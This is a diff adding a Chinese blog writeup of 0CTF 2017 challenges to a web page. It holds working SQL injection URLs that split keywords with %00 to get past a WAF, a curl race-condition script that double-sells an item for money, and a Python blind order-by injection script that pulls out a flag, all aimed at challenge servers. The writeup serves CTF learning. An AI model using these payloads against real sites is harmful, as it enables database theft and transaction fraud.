@@ -86,16 +86,30 @@
 
 
 
-<meta name="description" content="sqlin">
+<meta name="description" content="经过几次XCTF的洗礼，迎来了第一次国际大赛0CTF，每次看Scoreboard都在仰望各位dalao，再回头看看自己手头上想了一早上还没有结果的题。
+这是最终的排名，我大CMU的PPP战队是没发挥好嘛。
+这是新手区的排名，找找sysu战队在哪儿。
+Welcome - Misc签到题。基本上就是去一个IRC聊天室，输入频道名称#0ctf2017，就能看到顶端挂着flag了。（做出了签到题好激动）">
 <meta property="og:type" content="article">
 <meta property="og:title" content="0CTF 2017 Writeup">
 <meta property="og:url" content="http://cheesehigh.com/2017/03/26/0ctf2017/index.html">
 <meta property="og:site_name" content="Cheese High">
-<meta property="og:description" content="sqlin">
-<meta property="og:updated_time" content="2017-03-26T08:58:53.000Z">
+<meta property="og:description" content="经过几次XCTF的洗礼，迎来了第一次国际大赛0CTF，每次看Scoreboard都在仰望各位dalao，再回头看看自己手头上想了一早上还没有结果的题。
+这是最终的排名，我大CMU的PPP战队是没发挥好嘛。
+这是新手区的排名，找找sysu战队在哪儿。
+Welcome - Misc签到题。基本上就是去一个IRC聊天室，输入频道名称#0ctf2017，就能看到顶端挂着flag了。（做出了签到题好激动）">
+<meta property="og:image" content="http://o86az1gay.bkt.clouddn.com/top10.png">
+<meta property="og:image" content="http://o86az1gay.bkt.clouddn.com/risingstar.png">
+<meta property="og:image" content="http://o86az1gay.bkt.clouddn.com/simplesqlin.png">
+<meta property="og:image" content="http://o86az1gay.bkt.clouddn.com/temmo.png">
+<meta property="og:updated_time" content="2017-03-27T10:42:41.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0CTF 2017 Writeup">
-<meta name="twitter:description" content="sqlin">
+<meta name="twitter:description" content="经过几次XCTF的洗礼，迎来了第一次国际大赛0CTF，每次看Scoreboard都在仰望各位dalao，再回头看看自己手头上想了一早上还没有结果的题。
+这是最终的排名，我大CMU的PPP战队是没发挥好嘛。
+这是新手区的排名，找找sysu战队在哪儿。
+Welcome - Misc签到题。基本上就是去一个IRC聊天室，输入频道名称#0ctf2017，就能看到顶端挂着flag了。（做出了签到题好激动）">
+<meta name="twitter:image" content="http://o86az1gay.bkt.clouddn.com/top10.png">
 
 
 
@@ -313,7 +327,33 @@
       
 
       
-        <h2 id="sqlin"><a href="#sqlin" class="headerlink" title="sqlin"></a>sqlin</h2>
+        <p>经过几次XCTF的洗礼，迎来了第一次国际大赛0CTF，每次看Scoreboard都在仰望各位dalao，再回头看看自己手头上想了一早上还没有结果的题。</p>
+<p>这是最终的排名，我大CMU的PPP战队是没发挥好嘛。<br><img src="http://o86az1gay.bkt.clouddn.com/top10.png" alt="top10"></p>
+<p>这是新手区的排名，找找sysu战队在哪儿。<br><img src="http://o86az1gay.bkt.clouddn.com/risingstar.png" alt="sysu"></p>
+<h2 id="Welcome-Misc"><a href="#Welcome-Misc" class="headerlink" title="Welcome - Misc"></a>Welcome - Misc</h2><p>签到题。基本上就是去一个<a href="https://webchat.freenode.net/" target="_blank" rel="external">IRC聊天室</a>，输入频道名称#0ctf2017，就能看到顶端挂着flag了。<em>（做出了签到题好激动）</em></p>
+<h2 id="simplesqlin-Web"><a href="#simplesqlin-Web" class="headerlink" title="simplesqlin - Web"></a>simplesqlin - Web</h2><p>字面上是一个简单的SQL注入题，URL是<a href="http://202.120.7.203/index.php?id=1，参数id以GET方式传入。一般的注入尝试都失败了，原因在于这个题目使用了WAF，于是想到使用%00夹在各种SQL关键字中绕过。" target="_blank" rel="external">http://202.120.7.203/index.php?id=1，参数id以GET方式传入。一般的注入尝试都失败了，原因在于这个题目使用了WAF，于是想到使用%00夹在各种SQL关键字中绕过。</a></p>
+<p>首先利用union select找到SCHEMA_NAME，第二个字段中出现information_schema,news</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.120.7.203/index.php?id=1%20and%201=0%20uni%00on%20sel%00ect%201,GROUP_CONCAT(SCHEMA_NAME),3%20fr%00om%20information_schema.SCHEMATA</div></pre></td></tr></table></figure>
+<p>通过news找到TABLE_NAME，第二个字段出现flag, news，说明flag藏在flag表中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.120.7.203/index.php?id=1%20and%201=0%20uni%00on%20sel%00ect%201,GROUP_CONCAT(TABLE_NAME),3%20fr%00om%20information_schema.TABLES%20whe%00re%20TABLE_SCHEMA=%27news%27</div></pre></td></tr></table></figure>
+<p>最后得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.120.7.203/index.php?id=1%20and%201=0%20uni%00on%20sel%00ect%201,flag,3%20fr%00om%20flag</div></pre></td></tr></table></figure>
+<p><img src="http://o86az1gay.bkt.clouddn.com/simplesqlin.png" alt="simplesqlin"></p>
+<h2 id="Temmo’s-Tiny-Shop-Web"><a href="#Temmo’s-Tiny-Shop-Web" class="headerlink" title="Temmo’s Tiny Shop - Web"></a>Temmo’s Tiny Shop - Web</h2><p>比赛的时候知道要买到hint才能进行下一步，但是普通账户注册完一进去只有4000块，而hint却要8000块，很尴尬。原来是要用到race condition才能刷钱买hint，刷钱脚本如下。原理在于后台对于买卖请求只会按照cookie进行标识，如果使用不同的cookie同时卖出一个物品的时候，请求就会顺利通过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">username=&quot;ian&quot;</div><div class="line">password=&quot;123&quot;</div><div class="line">cookie1=&quot;PHPSESSID=gseqg01fg54is7nh733lch3eu1&quot;</div><div class="line">cookie2=&quot;PHPSESSID=r18k5gc0mvu94urgd04k8hgbl7&quot;</div><div class="line">url=&quot;http://202.120.7.197/app.php&quot;</div><div class="line"></div><div class="line">curl &quot;$url?action=login&quot; -b $cookie1 -d &quot;username=$username&amp;pwd=$password&quot; &amp;\</div><div class="line">curl &quot;$url?action=login&quot; -b $cookie2 -d &quot;username=$username&amp;pwd=$password&quot;</div><div class="line"></div><div class="line">curl &quot;$url?action=buy&amp;id=1&quot; -b $cookie1</div><div class="line"></div><div class="line">curl &quot;$url?action=sale&amp;id=1&quot; -b $cookie1 &amp;\</div><div class="line">curl &quot;$url?action=sale&amp;id=1&quot; -b $cookie2</div></pre></td></tr></table></figure>
+<p>执行之后账户里会变成8000块钱，顺利买到hint。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">OK! Now I will give some hint: you can get flag by use `select flag from ce63e444b0d049e9c899c9a0336b3c59`</div></pre></td></tr></table></figure>
+<p>hint为<code>select flag from ce63e444b0d049e9c899c9a0336b3c59</code>。</p>
+<p>怀疑orderby存在注入点。首先在商店里买两样东西，点search按钮，使用Burp Suite拦截数据包并更改GET请求中的order参数，具体思路是一个个匹配flag的字符，如果匹配到那么就以price排序，否则以name排序。</p>
+<p>这里试验第一个字符是否为0，果然返回的商品以name排序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/app.php?action=search&amp;keyword=&amp;order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1)like(0x00),price,name)</div></pre></td></tr></table></figure>
+<p>再次试验第一个字符是否为f，返回的商品以price排序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/app.php?action=search&amp;keyword=&amp;order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1)like(0x66),price,name)</div></pre></td></tr></table></figure>
+<p>因此，最终脚本如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line"></div><div class="line">url = &quot;http://202.120.7.197/&quot;</div><div class="line">cookie = &#123;&apos;PHPSESSID&apos;: &apos;qlqmjbq7uglcr0onm1lmm4ndg4&apos;&#125;</div><div class="line">r=requests.get(url+&apos;app.php?action=search&amp;keyword=&amp;order=if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),3))like(0x2562)),name,price)&apos;, cookies=cookie)</div><div class="line">err = r.text</div><div class="line">s = &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&apos;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&apos;&quot;_%&apos;</div><div class="line">def check(payload):</div><div class="line">	cookie = &#123;&apos;PHPSESSID&apos;: &apos;qlqmjbq7uglcr0onm1lmm4ndg4&apos;&#125;</div><div class="line">	r=requests.get(url+&apos;app.php?action=search&amp;keyword=&amp;order=&apos;+payload, cookies=cookie)</div><div class="line">	return r.text</div><div class="line">flag = &quot;&quot;</div><div class="line">for m in range(1,35):</div><div class="line">	for i in s:</div><div class="line">		payload = &quot;if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),%s))like(0x25%s)),name,price)&quot; % (str(m), hex(ord(i))[2:])</div><div class="line">		if check(payload) != err:</div><div class="line">			flag +=i</div><div class="line">			print flag</div><div class="line">			break</div></pre></td></tr></table></figure>
+<p>最后得到flag</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/temmo.png" alt="temmo"></p>
+<h2 id="char-Pwn"><a href="#char-Pwn" class="headerlink" title="char - Pwn"></a>char - Pwn</h2>
       
     </div>
 
@@ -486,7 +526,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlin"><span class="nav-number">1.</span> <span class="nav-text">sqlin</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Welcome-Misc"><span class="nav-number">1.</span> <span class="nav-text">Welcome - Misc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#simplesqlin-Web"><span class="nav-number">2.</span> <span class="nav-text">simplesqlin - Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Temmo’s-Tiny-Shop-Web"><span class="nav-number">3.</span> <span class="nav-text">Temmo’s Tiny Shop - Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#char-Pwn"><span class="nav-number">4.</span> <span class="nav-text">char - Pwn</span></a></li></ol></div>
             
           </div>
         </section>
